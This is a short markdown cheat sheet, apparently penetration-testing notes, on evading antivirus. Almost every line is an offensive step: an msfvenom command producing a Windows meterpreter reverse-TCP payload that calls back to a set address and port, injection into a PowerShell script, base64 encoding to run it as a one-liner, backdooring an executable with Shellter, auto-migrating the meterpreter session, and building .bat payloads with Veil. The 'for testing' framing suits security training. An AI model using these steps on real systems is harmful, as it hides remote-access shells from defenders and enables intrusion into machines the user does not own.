# Anti Virus Evasion

Generate a malicious payload for testing with AV:
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=443 -f powershell`

Add the output to  `in_memory_injection.ps1`.

Create a listener in `msfconsole`.

Encode script in base64 and decode as a one liner. `powershell -E XXXX`:  
https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py

Install shellter and wine32
```bash
sudo apt install shellter
sudo dpkg --add-architecture i386 && sudo apt-get update &&
sudo apt-get install wine32
```

Run shellter on the executable, configure with the correct address and port for the IP reverse shell.

In the meterpreter exploit/multi/handler you may need to use the following line to migrate to another process:
`set AutoRunScript post/windows/manage/migrate`

Use Veil to generate .bat files:
https://github.com/Veil-Framework/Veil
